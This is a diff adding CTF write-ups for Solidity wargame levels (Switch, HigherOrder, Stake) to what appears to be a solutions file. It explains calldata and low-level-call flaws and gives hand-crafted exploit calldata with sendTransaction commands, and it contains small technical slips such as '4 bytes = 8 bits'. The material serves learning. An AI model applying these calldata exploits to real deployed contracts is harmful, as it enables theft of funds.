@@ -342,3 +342,27 @@ interface INotifyable {
 **GatekeeperThree**
 
 - Description: To deal with this `GatekeeperThree` contract, we will have knowledge in some terms such as `Low level function`, `How EVM storage works`. In `gateOne` check, we need to create an EOA account and use it to call `GatekeeperThree::construct0r` to be `GatekeeperThree::owner`, after that we just call the `GatekeeperThree::enter` function by this EOA. Next one, we have to call `GatekeeperThree::createTrick` to create `SimpleTrick` contract and `GatekeeperThree::getAllowance` function with a password which is read in `slot 2` of `SimpleTrick` contract's storage. Easily with `gateThree`, we send an amount ether larger than `0.001 ether` to `GatekeeperThree`.
+
+**Switch**
+
+- Description: As we can see in `Switch` contract, the `onlyOff` modifier require the to copy the message data `msg.data` from position 68 with the length is 4 and compare it with the `Switch::offSelector` value. It means that we will call the `Switch::flipSwitch` function with `_data` argument which is equal `offSelector` in the same `bytes4` type. If it is succeed, the contract will call itself with `_data`. So, we can pass the encoding function as the end of `_data`.
+- `offSelector` = 0x20606e15
+- `abi.encodeFunctionSignature("turnSwitchOn()")` = 0x76227e12
+- `_data` = 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
+  => We just send the transaction with the data is the above value.
+  `await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"}}`
+
+**HigherOrder**
+
+- Description: The goal of `HigherOrder` contract is that we become a `commander`. To become `commander`, we have to call `HigherOrder::claimLeadership` function with bypass the `(treasury > 255)` condition. Therefore, we need to set `treasury` value larger than `255` (uint256). The `registerTreasury` function provide the yul code block which is able to set `calldataload(4)` to `treasury` storage slot. The `calldataload(4)` will load the bytes from position 8 (4 bytes = 8 bits) to position 8 + 32. Because of it, we will make the bytes data for calling `registerTreasury()` function with bytes data value of `256` (256 > 255) applying from position 8 to position 8 + 32.
+
+`256` = 0x100 (Hex) = 0x0000000000000000000000000000000000000000000000000000000000000100 (Bytes32)
+`registerTreasury(uint8)` = 0x211c85ab
+
+=> `data` = "0x211c85ab000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+
+Send Transaction Command: await sendTransaction({from: player, to contract.address, data:"0x211c85ab000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"})
+
+**Stake**
+
+- Description: The vulnerability of `Stake` contract is that calling the functions of others call by `call` which is a low level function, in this case that it's calling `allowance` and `transferFrom` function in `WETH` contract. Why is it vulnerable? Because it will return the boolean variable of the state of action, it mean that it will return true if successfully and false if vice verse, it will not revert transactions when failed.
